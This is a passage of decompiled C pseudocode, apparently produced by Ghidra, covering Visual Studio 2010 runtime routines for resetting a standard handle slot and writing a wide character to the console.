          if (param_1 != 2) goto LAB_0040f66c;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0040f66c:
      *(undefined4 *)(iVar4 + (&DAT_0041eac0)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar2 = __errno();
  *piVar2 = 9;
  puVar3 = ___doserrno();
  *puVar3 = 0;
  return -1;
}





/* Function: __putwch_nolock */

/* Library Function - Single Match
    __putwch_nolock
   
   Library: Visual Studio 2010 Release */

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  BOOL BVar1;
  DWORD local_8;
  
  if (DAT_00419f30 == (HANDLE)0xfffffffe) {
    ___initconout();
  }
  if (DAT_00419f30 != (HANDLE)0xffffffff) {
    BVar1 = WriteConsoleW(DAT_00419f30,&_WCh,1,&local_8,(LPVOID)0x0);
    if (BVar1 != 0) {
      return _WCh;
    }
  }
  return 0xffff;
}



